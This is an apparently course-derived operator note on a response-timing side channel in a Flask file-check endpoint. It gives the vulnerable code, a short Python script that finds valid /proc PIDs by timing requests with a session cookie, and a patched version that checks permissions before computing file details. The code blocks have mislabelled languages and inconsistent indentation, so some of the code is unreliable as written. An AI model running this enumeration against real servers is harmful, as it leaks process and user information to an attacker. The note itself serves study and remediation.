---
technique: "Data Exfiltration via Response Timing"
family: "misc"
severity_hint: "medium"
tags: []
source: "_raw/Web attacks/Web Attacks/Race Conditions & Timing Attacks/Data Exfiltration via Response Timing.md"
source_sha256: "073615d6c106a2b70ed66d1394dcc93ab9b9ad621e6a6221647d8de3fecd7751"
curator_version: 2
review_status: imported-unreviewed
---

# Data Exfiltration via Response Timing

> Family: **misc** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: # return fileowner, filesize (recursively), and number of subfiles (recursively)`
- `c: import requests`
- `python: # return fileowner, filesize (recursively), and number of subfiles (recursively)`

## Playbook (operator notes)

# Data Exfiltration via Response Timing

# **Code Review - Identifying the Vulnerability**

- Example: Web application that shows us files we own on the filesystem

```python
# return fileowner, filesize (recursively), and number of subfiles (recursively)
def get_file_details(path):
    try:
    
				# Returns early if the path does not exists
        if not os.path.exists(path):
            return '', 0, 0

        # number of subfiles
        filecount = 0
        for root_dir, cur_dir, files in os.walk(path):
            filecount += len(files)

        # file size
        path = Path(path)
        filesize = sum(f.stat().st_size for f in path.glob('**/*') if f.is_file())

        # file owner
        owner = path.owner()

        return owner, filesize, filecount

    except:
        return '', 0, 0

<SNIP>

@app.route('/filecheck', methods=['GET'])
def filecheck():

		# Only if we are logged in
    if not session.get('logged_in'):
        return redirect(url_for('index'))

    user = session.get('user')
    filepath = request.args.get('filepath')

		# Calculates before the check and return, takes longer if it exists
    owner, filesize, filecount = get_file_details(filepath)

    if (user == 'root') or (user == owner):
        return render_template('filecheck.html', message="Success!", type="success", file=filepath, owner=owner, filesize=filesize, filecount=filecount)

    return render_template('filecheck.html', message="Access denied!", type="danger", file=filepath)
```

Keep in mind that the function takes longer because it recursively steps through each subdirectory to determine file sizes and the number of files. If we request a single file that is valid, like `/etc/passwd`, the timing difference is similar to an invalid file path because there are no subdirectories to check:

```c
import requests

URL = "http://172.17.0.2:1337/filecheck"
cookies = {"session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZCh4Qw.Lv94ak_WPWEN8Idhwf7l-3a5MH4"}
THRESHOLD_S = 0.003

for pid in range(0, 200):
    r = requests.get(URL, params={"filepath": f"/proc/{pid}/"}, cookies=cookies)

    if r.elapsed.total_seconds() > THRESHOLD_S:
        print(f"Valid PID found: {pid}")
```

<aside>
💡

Remember that this attack's reliability depends on the processing time the web application takes to compute the meta information for the directory. Since the process directories generally do not contain many subdirectories, we must carefully fine-tune our threshold. We can use known valid and known invalid values for this fine-tuning process. Furthermore, the exploit is not entirely reliable, particularly if run over the public internet. Thus, we may need to run the exploit multiple times and eliminate false positives by checking which results come up in multiple runs and which are false positives. Another way we could exploit the vulnerability is by enumerating valid system users by enumerating existing home folders in `/home/`. Since users may keep additional data in their home directories, the exploit becomes more reliable.

</aside>

# PoC

Use Intruder

# **Prevention & Patching**

Generally, preventing timing vulnerabilities is not easy since we must consider differences in processing time and what kind of information these differences might reveal to an attacker. In our case, we must implement the permission check `before` the computation of file meta-information. Thus, the function can return early if the user has insufficient permissions, and the web server can send an early response. Thus, there is no significant timing difference if the user provided a valid or invalid path. We could implement this by adding a `user` argument to the `get_file_details` function and returning early in case of insufficient permissions:

Code: python

```python
# return fileowner, filesize (recursively), and number of subfiles (recursively)
def get_file_details(path, user):
    try:
        if not os.path.exists(path):
            return '', 0, 0

		# permission check
		path = Path(path)
		owner = path.owner()
		if (user != 'root') and (user != owner):
			return '', 0, 0

        # number of subfiles
        filecount = 0
        for root_dir, cur_dir, files in os.walk(path):
            filecount += len(files)

        # file size
        filesize = sum(f.stat().st_size for f in path.glob('**/*') if f.is_file())

        return owner, filesize, filecount

    except:
        return '', 0, 0
```

## Source
Original note: `_raw/Web attacks/Web Attacks/Race Conditions & Timing Attacks/Data Exfiltration via Response Timing.md`
